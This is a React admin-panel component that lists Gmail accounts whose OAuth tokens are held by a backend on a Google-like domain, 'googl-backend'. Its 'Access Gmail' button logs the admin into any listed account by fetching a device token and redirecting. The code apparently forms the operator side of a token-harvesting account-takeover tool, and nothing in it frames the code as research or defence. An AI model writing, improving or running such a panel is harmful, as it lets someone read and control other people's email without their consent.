import React, { useState, useEffect, useCallback } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import "./DeviceA.css";

const DeviceA = ({ adminToken: initialAdminToken, setAdminToken }) => {
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const navigate = useNavigate();

  const storedToken = initialAdminToken || localStorage.getItem("adminToken");

  const handleLogout = useCallback(() => {
    localStorage.removeItem("adminToken");
    if (typeof setAdminToken === "function") {
      setAdminToken(null);
    }
    navigate("/admin-login");
  }, [navigate, setAdminToken]);

  useEffect(() => {
    if (!storedToken) {
      navigate("/admin-login");
      return;
    }

    const fetchDevices = async () => {
      try {
        setLoading(true);
        const response = await axios.get(
          "https://googl-backend.onrender.com/auth/list-devices",
          {
            headers: {
              Authorization: `Bearer ${storedToken}`,
              "Content-Type": "application/json",
            },
          }
        );

        // Filter only users with OAuth tokens
        const activeDevices = response.data?.devices?.filter(
          device => device.oauthToken
        ) || [];
        
        setDevices(activeDevices);
        setError(null);
      } catch (error) {
        console.error("Error fetching devices:", error.response || error);
        const errorMessage =
          error.response?.data?.error || "Failed to fetch devices";
        setError(errorMessage);

        if (error.response?.status === 401 || error.response?.status === 403) {
          handleLogout();
        }
      } finally {
        setLoading(false);
      }
    };

    fetchDevices();
  }, [storedToken, navigate, handleLogout]);

  const loginAsDevice = async (device) => {
    try {
      if (!storedToken) {
        throw new Error("No authentication token found");
      }

      const response = await axios.post(
        "https://googl-backend.onrender.com/auth/login-to-device",
        { deviceBEmail: device.email },
        {
          headers: {
            Authorization: `Bearer ${storedToken}`,
            "Content-Type": "application/json",
          },
        }
      );

      if (response.data.deviceToken && response.data.redirectUrl) {
        // Store the device token for Gmail Manager
        localStorage.setItem("deviceToken", response.data.deviceToken);
        window.location.href = response.data.redirectUrl;
      } else {
        throw new Error("Invalid response from server");
      }
    } catch (err) {
      console.error("Error logging in as device:", err.response || err);
      setError(
        `Failed to log in as device: ${err.response?.data?.error || err.message}`
      );
    }
  };

  return (
    <div className="admin-container">
      <button className="logout-button" onClick={handleLogout}>
        Logout
      </button>
      <h2 className="admin-title">Admin Panel</h2>

      {error && <div className="error-message">{error}</div>}

      <div className="device-list">
        <h3>Connected Gmail Accounts {loading && "(Loading...)"}</h3>
        {loading ? (
          <p>Loading devices...</p>
        ) : devices.length === 0 ? (
          <p className="no-devices">No connected Gmail accounts found.</p>
        ) : (
          <>
            <p>Total accounts: {devices.length}</p>
            <ul>
              {devices.map((device, index) => (
                <li key={device.email || index} className="device-item">
                  <div className="device-info">
                    <img 
                      src={device.profileData?.picture || "/api/placeholder/32/32"} 
                      alt="Profile" 
                      className="profile-picture"
                    />
                    <span>{device.email || "Unknown Account"}</span>
                  </div>
                  <button
                    className="login-button"
                    onClick={() => loginAsDevice(device)}
                  >
                    Access Gmail
                  </button>
                </li>
              ))}
            </ul>
          </>
        )}
      </div>
    </div>
  );
};

export default DeviceA;